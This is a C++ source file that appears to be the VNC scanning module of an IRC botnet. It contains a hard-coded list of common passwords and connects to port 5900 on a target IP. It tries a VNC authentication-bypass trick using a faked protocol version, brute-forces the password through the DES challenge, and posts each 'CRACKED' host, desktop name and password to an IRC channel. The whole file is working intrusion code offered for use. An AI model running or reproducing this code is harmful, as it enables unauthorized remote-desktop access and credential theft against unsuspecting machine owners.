#include "include.h"
#ifndef NO_VNC
#include "rfb.h"
extern "C" {
#include "d3des.h"
}


//////////////////////////////
//    VNC CONFIGURATION     //
//////////////////////////////

////////////////////////////////
///      SET PASSWORDS       ///
/// TIPS: DONT USE TOO MANY  ///
////////////////////////////////

char *passwordlist[] = {
"123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"abc",
"abcd",
"abcde",
"qwerty",
"1",
"admin",
"pass",
"password",
"love"
};

////////////////////////////////
/// SET MAX PASSWORD LENGHT  ///
////////////////////////////////

#define MAXPWLEN 8

////////////////////////////
/// END OF CONFIGURATION ///
////////////////////////////
#define CHALLENGESIZE 16
#define sizeofpasslist (sizeof(passwordlist) / sizeof(LPTSTR))

int ext_num;
int usedlist[sizeofpasslist];

unsigned char fixedkey[8] = {23,82,107,6,35,78,88,7};

void vncEncryptBytes(unsigned char *bytes, char *passwd)
{
    unsigned char key[8];
    unsigned int i;
    for (i = 0; i < 8; i++) {
		if (i < strlen(passwd)) {
		    key[i] = passwd[i];
		} else {
		    key[i] = 0;
		}
    }

    deskey(key, EN0);

    for (i = 0; i < CHALLENGESIZE; i += 8) {
		des(bytes+i, bytes+i);
    }
}

void vncEncryptPasswd(unsigned char *encryptedPasswd, char *passwd )
{
	unsigned int i;
    for (i = 0; i < MAXPWLEN; i++) {
		if (i < strlen(passwd)) {
			encryptedPasswd[i] = passwd[i];
		} else {	
			encryptedPasswd[i] = 0;
		}
    }

    deskey(fixedkey, EN0);
    des(encryptedPasswd, encryptedPasswd);
}

BOOL ReadExact(SOCKET r_sock, char *inbuf, int wanted) {

	int offset = 0;
	
	while (wanted > 0) {
		int bytes = recv(r_sock, inbuf+offset, wanted, 0);
		if ((bytes == 0) || (bytes == SOCKET_ERROR)) return FALSE;
		wanted -= bytes;
		offset += bytes;
	}

	return TRUE;
}

BOOL WriteExact(SOCKET w_sock, char *buf, int bytes) {

	if (bytes == 0) return FALSE;

	int i = 0;
    int j;

    while (i < bytes) {
		j = send(w_sock, buf+i, bytes-i, 0);
		if (j == SOCKET_ERROR || j==0) return FALSE;
		i += j;
    }

	return TRUE;
}

inline void ReadString(SOCKET s_sock, char *buf, int length)
{
	if (length > 0)
		ReadExact(s_sock, buf, length);
	buf[length] = '\0';
}
void SendKey(SOCKET sock, char bkey, char key, int state)
{
	char sendkey[8];
	memset(sendkey, '\x04', 1);

	if (state == 0 || state == 1)
		memset(sendkey + 1, state, 1);
	else
		memset(sendkey + 1, 1, 1);

	memset(sendkey + 2, 0, 4);
	memset(sendkey + 6, bkey, 1);
	memset(sendkey + 7, key, 1);

	send(sock, sendkey, sizeof(sendkey), 0);

	if (state > 1)
	{
		memset(sendkey + 1, 0, 1);
		send(sock, sendkey, sizeof(sendkey), 0);
	}
}
BOOL VNCPassCheck(SOCKET Sock, char IP[16], BOOL UseCFTP, BOOL Root) {

	char SendBuf[MAX_LINE_SIZE];

	int CFretry = 0;
	BOOL ABcheck = TRUE;
	int checked = 0;
	int r;

	srand(GetTickCount());
	r = rand()%sizeofpasslist;
	while (1) {

		struct sockaddr_in thataddr;
		int res;
		SOCKET m_sock;

		m_sock = socket(PF_INET, SOCK_STREAM, 0);
		if (m_sock == INVALID_SOCKET) {
			closesocket(m_sock);
			return FALSE;
		}
		
		thataddr.sin_addr.s_addr = inet_addr(IP);
		thataddr.sin_family = AF_INET;
		thataddr.sin_port = htons(5900);	

		res = connect(m_sock, (LPSOCKADDR) &thataddr, sizeof(thataddr));
		if (res == SOCKET_ERROR) {
			closesocket(m_sock);		
			return FALSE;
		}
		rfbProtocolVersionMsg pv;

		if (!ReadExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
			closesocket(m_sock);
			return FALSE;
		}

		pv[sz_rfbProtocolVersionMsg] = 0;

		int m_majorVersion, m_minorVersion;

		if (sscanf(pv,rfbProtocolVersionFormat,&m_majorVersion,&m_minorVersion) != 2) {
			closesocket(m_sock);
			return FALSE;
		}

		if ((m_majorVersion == 3) && (m_minorVersion < 3)) {
			closesocket(m_sock);
			return FALSE;
		}

		if ((m_majorVersion == 3) && (m_minorVersion == 8) && ABcheck) {
			sprintf(pv, rfbProtocolVersionFormat, rfbProtocolMajorVersion, rfbProtocolMinorVersionFake);
		} else {
			sprintf(pv, rfbProtocolVersionFormat, rfbProtocolMajorVersion, rfbProtocolMinorVersion);
			ABcheck = FALSE;
		}

		if (!WriteExact(m_sock, pv, sz_rfbProtocolVersionMsg)) {
			closesocket(m_sock);
			return FALSE;
		}

		CARD32 authScheme, authResult;
		CARD8 challenge[CHALLENGESIZE];

		if (ABcheck) {
			ABcheck = FALSE;
			char szClientPacket[] = "\x01";
			if (!ReadExact(m_sock, (char *)&authScheme, 2)) {
				closesocket(m_sock);
				return FALSE;
			}
			if (!WriteExact(m_sock, szClientPacket, 1)) {
				closesocket(m_sock);
				return FALSE;
			}
			if (ReadExact(m_sock, (char *) &authResult, 4)) {
			
				authResult = Swap32IfLE(authResult);
			
				switch (authResult) {
				case rfbVncAuthOK: 
					{		
						rfbServerInitMsg m_si;
						if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
							ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
							m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
							m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
							m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
							m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
							m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
							m_si.nameLength = Swap32IfLE(m_si.nameLength);

							TCHAR *m_desktopName;
							m_desktopName = new TCHAR[m_si.nameLength + 2];

							ReadString(m_sock, m_desktopName, m_si.nameLength);

							_snprintf(SendBuf, sizeof(SendBuf), "\2VNC%d.%d CRACKED\2 (%s:) %s - \2authbypass\2", 
								m_majorVersion, m_minorVersion, m_desktopName, IP);
							IrcPrivmsg(Sock, VNCChan, SendBuf);
							memset(SendBuf, 0, sizeof(SendBuf));

						}

						closesocket(m_sock);
						return TRUE;
					}
				default:
					{
						closesocket(m_sock);
						break;
					}	
				}
			} else {				
				closesocket(m_sock);
			}
			Sleep(5000);

		} else {
			if (!ReadExact(m_sock, (char *)&authScheme, 4)) {
				closesocket(m_sock);
				return FALSE;
			}

			authScheme = Swap32IfLE(authScheme);
	
			switch (authScheme) {
		
			case rfbConnFailed:
				{
					closesocket(m_sock);
					CFretry++;
					if (CFretry == 2) {
						return FALSE;
					}
					Sleep(2000);
					break;
				}
		
			case rfbNoAuth:
				{
					rfbServerInitMsg m_si;
					if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
						ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
						m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
						m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
						m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
						m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
						m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
						m_si.nameLength = Swap32IfLE(m_si.nameLength);

						TCHAR *m_desktopName;
						m_desktopName = new TCHAR[m_si.nameLength + 2];

						ReadString(m_sock, m_desktopName, m_si.nameLength);

						_snprintf(SendBuf, sizeof(SendBuf), "\2VNC%d.%d CRACKED\2 (%s): %s - [NoPass]", 
							m_majorVersion, m_minorVersion, m_desktopName, IP);
						IrcPrivmsg(Sock, VNCChan, SendBuf);
						memset(SendBuf, 0, sizeof(SendBuf));
					}

					closesocket(m_sock);
					return TRUE;
				}
		
			case rfbVncAuth:
				{
					if (!ReadExact(m_sock, (char *)challenge, CHALLENGESIZE)) {
						closesocket(m_sock);
						return FALSE;
					}

					char passwd[256];	
					unsigned char m_encPasswd[8];

					r++;
					if (r == sizeofpasslist)
						r = 0;
					strncpy(passwd, passwordlist[r], sizeof(passwd)-1);

					passwd[strlen(passwd)] = '\0';

					vncEncryptPasswd(m_encPasswd, passwd);				
	
					vncEncryptBytes(challenge, passwd);
			
					if (!WriteExact(m_sock, (char *) challenge, CHALLENGESIZE)) {
						closesocket(m_sock);
						return FALSE;
					}

					if (!ReadExact(m_sock, (char *) &authResult, 4)) {
						closesocket(m_sock);
						return FALSE;
					}
			
					authResult = Swap32IfLE(authResult);
			
					switch (authResult) {
					case rfbVncAuthOK: 
						{		
							rfbServerInitMsg m_si;
							if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
								ReadExact(m_sock, (char *) &m_si, sz_rfbServerInitMsg)) {							
								m_si.framebufferWidth = Swap16IfLE(m_si.framebufferWidth);
								m_si.framebufferHeight = Swap16IfLE(m_si.framebufferHeight);
								m_si.format.redMax = Swap16IfLE(m_si.format.redMax);
								m_si.format.greenMax = Swap16IfLE(m_si.format.greenMax);
								m_si.format.blueMax = Swap16IfLE(m_si.format.blueMax);
								m_si.nameLength = Swap32IfLE(m_si.nameLength);

								TCHAR *m_desktopName;
								m_desktopName = new TCHAR[m_si.nameLength + 2];

								ReadString(m_sock, m_desktopName, m_si.nameLength);

								_snprintf(SendBuf, sizeof(SendBuf), "\2VNC%d.%d CRACKED\2 (%s:) %s - %s", 
									m_majorVersion, m_minorVersion, m_desktopName, IP, passwd);
								IrcPrivmsg(Sock, VNCChan, SendBuf);
								memset(SendBuf, 0, sizeof(SendBuf));


							}

							closesocket(m_sock);
							return TRUE;
						}
					case rfbVncAuthFailed: 
						{
							CFretry = 0;
							closesocket(m_sock);
							checked++;
							if (checked == sizeofpasslist)
								return FALSE;
							Sleep(5000);
							break;
						}
					default:
						{
							closesocket(m_sock);
							return FALSE;
						}
					}
					break;
				}
		
			default:
				{
				closesocket(m_sock);
				return FALSE;
				}
			}
		}
		if (m_sock != INVALID_SOCKET) {
			shutdown(m_sock, SD_BOTH);
			closesocket(m_sock);
			m_sock = INVALID_SOCKET;
		}
		Sleep(100);
	}
	return FALSE;
}

#endif

